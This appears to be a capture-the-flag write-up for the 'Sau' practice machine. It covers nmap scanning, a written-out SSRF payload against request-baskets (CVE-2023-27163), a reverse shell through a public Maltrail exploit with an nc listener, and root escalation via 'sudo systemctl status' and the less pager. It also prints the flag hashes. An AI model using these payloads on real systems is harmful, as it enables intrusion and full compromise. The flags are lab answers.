# Sau
#activemachine 
#easy 
#web 
### Reconnaissance
We started by running the command `nmap -sV -v $TARGET` to gather information about the target system. The output showed us the open ports, services, and version information. We noticed that port 22 (SSH) was open, also the port 80 (HTTP), lastly the port 55555 is also open.
```
Nmap scan report for 10.10.11.224
Host is up (0.047s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
55555/tcp open     unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.93%I=7%D=11/29%Time=65670DDA%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Wed,\x2029\x20Nov\x2
SF:02023\x2010:09:29\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/
SF:web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x20
SF:200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Wed,\x2029\x20Nov\x2
SF:02023\x2010:09:29\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
SF:t,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Option
SF:s:\x20nosniff\r\nDate:\x20Wed,\x2029\x20Nov\x202023\x2010:09:55\x20GMT\
SF:r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20na
SF:me\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$
SF:\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.59 seconds

```
### Web Application Analysis

We start by analyzing the web application on port 80. If we try to access we realize that the web server is not loading properly, which suggests that there may be an issue with the application or its configuration. We decide to investigate further by attempting to enter the web which is running in the port 55555.
Once inside we can see that the web is Powered by [request-baskets](https://github.com/darklynx/request-baskets) | Version: 1.2.1, which is a popular web application framework for Linux.

Next, we search for known vulnerabilities in the application and find a [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163) vulnerability in the request-baskets package. This vulnerability allows an attacker to access network resources and sensitive information via a crafted API request, which could potentially lead to a full compromise of the system.

To exploit this vulnerability, we craft a specially formed JSON payload that will be sent to the web application. This command will create a basket that allow us to enter the web-server running in port 80 even if it is set to don't allow any access that doesn't come from localhost, allowing us to gain control of the server. We use the `curl` command to send the payload to the web server. The full command is `curl --location "http://${TARGET}:55555/api/baskets/a" --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'`
```
{"token":"ZP12n1WrM9BeOaO3gYXcca_63YdHGtHuiAnR_lkTLPEL"}
```

The output shows that the exploit was successful, and now we can enter the hidden website, to do so we enter to the following URL http://10.10.11.224:55555/a .

Once inside we can see that this website is running Maltrail (v**0.53**), as we know the exact program and version we can search for any known vulnerabilities, which led us to find https://github.com/spookier/Maltrail-v0.53-Exploit.
To execute the vulnerability we start by setting our local listener for the reverse shell `nc -lvnp 4444`, now we exploit the vulnerability by running `python3 exploit.py 10.10.14.60 4444 http://10.10.11.224:55555/a`

As we have a brand new shell we improve it and check who we are  `python3 -c 'import pty;pty.spawn("/bin/bash")'`, `whoami`
```
puma
```
It seems that we are a normal user so we read the user flag `cat ~/user.txt`
```
bc82979f0ee6e1164a1e822a76202bc8
```
### Privilege escalation
With our newfound control of the web server, we can now attempt to escalate our privileges to gain access to other systems on the network. We start by running the `id` command to verify our current user and group IDs. The output shows that we are currently running as the user `puma`, with a group ID of 1001.
```
uid=1001(puma) gid=1001(puma) groups=1001(puma)
```

Next, we use the `sudo -l` command to check for any default privileges that we may have been granted. The output shows that we have been granted the ability to run the `systemctl` command without a password, which could potentially be used to gain access to other systems on the network.
```
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

The output of `sudo /usr/bin/systemctl status trail.service` will be shown with less so we check if we can use that to perform the escalation. https://gtfobins.github.io/gtfobins/less/
It seems that we can so we run the command abd when given the option to write, we write `!/bin/sh` which will grant us a root terminal, to check this we run `whoami`
```
root
```
Lastly we get the root flag `cat /root/root.txt`
```
6b5250953d0e2301dc5920aa7cd8de15
```